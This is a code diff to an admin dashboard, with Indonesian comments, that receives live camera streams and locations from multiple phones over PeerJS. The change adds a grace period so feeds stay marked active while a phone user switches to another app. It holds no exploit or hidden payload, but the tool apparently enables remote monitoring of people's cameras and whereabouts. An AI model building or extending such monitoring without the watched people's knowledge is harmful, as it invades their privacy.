@@ -78,7 +78,8 @@
       border-radius: 999px;
     }
     .chip.live { background: rgba(22, 163, 74, 0.92); border-color: transparent; }
-    .chip.off { background: rgba(185, 28, 28, 0.9); border-color: transparent; }
+    .chip.bg { background: rgba(217, 119, 6, 0.92); border-color: transparent; }
+    .chip.off { background: rgba(185, 28, 28, 0.92); border-color: transparent; }
 
     .card-body { padding: 12px; display: flex; flex-direction: column; gap: 8px; font-size: 12px; }
     .device-id { font-weight: 700; color: #E2E8F0; font-size: 13px; }
@@ -118,7 +119,7 @@
 
   <script>
     const ADMIN_LOBBY_ID = "jirun-admin-lobby-9988";
-    const STALE_AFTER_MS = 10000;
+    const BACKGROUND_GRACE_MS = 25000; // Masa tunggu saat pindah ke app lain (mis. TikTok)
 
     let peer = null;
     const devices = {};
@@ -135,6 +136,7 @@
         const id = conn.peer;
         const entry = ensureDeviceEntry(id);
         entry.conn = conn;
+        entry.closedExplicitly = false;
         entry.connected = true;
         entry.updatedAt = Date.now();
         syncDeviceCard(id);
@@ -145,7 +147,18 @@
 
         conn.on("data", (msg) => {
           if (!msg) return;
+
+          if (msg.type === "HP_CLOSING") {
+            entry.closedExplicitly = true;
+            entry.connected = false;
+            entry.stream = null;
+            attachStreamToCard(id, null);
+            syncDeviceCard(id);
+            return;
+          }
+
           if (msg.type === "HP_PRESENCE") {
+            entry.closedExplicitly = false;
             entry.facing = msg.facing || entry.facing || "Depan";
             entry.cameraOn = msg.cameraOn !== undefined ? Boolean(msg.cameraOn) : true;
             entry.location = msg.location || entry.location;
@@ -164,8 +177,6 @@
           if (devices[id]) {
             devices[id].conn = null;
             devices[id].connected = false;
-            devices[id].stream = null;
-            attachStreamToCard(id, null);
             syncDeviceCard(id);
           }
         });
@@ -177,6 +188,7 @@
         entry.call = call;
         call.answer();
         call.on("stream", (remoteStream) => {
+          entry.closedExplicitly = false;
           entry.stream = remoteStream;
           entry.connected = true;
           entry.updatedAt = Date.now();
@@ -185,8 +197,7 @@
         });
         call.on("close", () => {
           entry.call = null;
-          entry.stream = null;
-          attachStreamToCard(id, null);
+          // Jangan langsung hapus stream jika masih dalam masa tunggu pindah aplikasi
           syncDeviceCard(id);
         });
       });
@@ -206,6 +217,7 @@
           device: "",
           updatedAt: Date.now(),
           connected: true,
+          closedExplicitly: false,
           conn: null,
           call: null,
           stream: null
@@ -324,28 +336,38 @@
 
       const ageMs = Date.now() - (d.updatedAt || 0);
       const ageSec = Math.max(0, Math.round(ageMs / 1000));
-      const isOnline = Boolean(d.connected) && ageMs <= STALE_AFTER_MS;
+      const withinGrace = !d.closedExplicitly && ageMs <= BACKGROUND_GRACE_MS;
       const hasLiveStream = Boolean(d.stream && d.stream.active);
 
       const statusChip = document.getElementById(`status_${id}`);
-      if (statusChip) {
-        if (!isOnline) {
-          statusChip.textContent = `MATI / OFFLINE (${ageSec}d)`;
+      const ph = document.getElementById(`ph_${id}`);
+
+      if (!withinGrace) {
+        if (d.stream) {
+          d.stream = null;
+          attachStreamToCard(id, null);
+        }
+        if (statusChip) {
+          statusChip.textContent = `MATI (${ageSec}d)`;
           statusChip.className = "chip off";
-        } else if (hasLiveStream) {
+        }
+        if (ph) {
+          ph.textContent = "Kamera mati (riwayat dihapus / koneksi terputus)";
+        }
+      } else if (hasLiveStream && d.connected) {
+        if (statusChip) {
           statusChip.textContent = `LIVE • ${d.facing || "Depan"}`;
           statusChip.className = "chip live";
-        } else {
-          statusChip.textContent = `TERHUBUNG • ${d.facing || "Depan"}`;
-          statusChip.className = "chip";
         }
-      }
-
-      const ph = document.getElementById(`ph_${id}`);
-      if (ph && !hasLiveStream) {
-        ph.textContent = !isOnline
-          ? "Koneksi terputus (aplikasi/halaman ditutup atau hilang sinyal)"
-          : "Menghubungkan stream kamera...";
+        attachStreamToCard(id, d.stream);
+      } else {
+        if (statusChip) {
+          statusChip.textContent = `LATAR BELAKANG (${ageSec}d)`;
+          statusChip.className = "chip bg";
+        }
+        if (ph && !hasLiveStream) {
+          ph.textContent = "Perangkat pindah aplikasi (menunggu stream/koneksi)...";
+        }
       }
 
       const loc = d.location;
@@ -381,14 +403,8 @@
         }
       }
 
-      if (hasLiveStream) {
-        attachStreamToCard(id, d.stream);
-      } else {
-        attachStreamToCard(id, null);
-      }
-
       const activeCount = Object.values(devices).filter(
-        (item) => item.connected && (Date.now() - (item.updatedAt || 0)) <= STALE_AFTER_MS
+        (item) => !item.closedExplicitly && (Date.now() - (item.updatedAt || 0)) <= BACKGROUND_GRACE_MS
       ).length;
       document.getElementById("onlineCount").textContent = activeCount;
     }
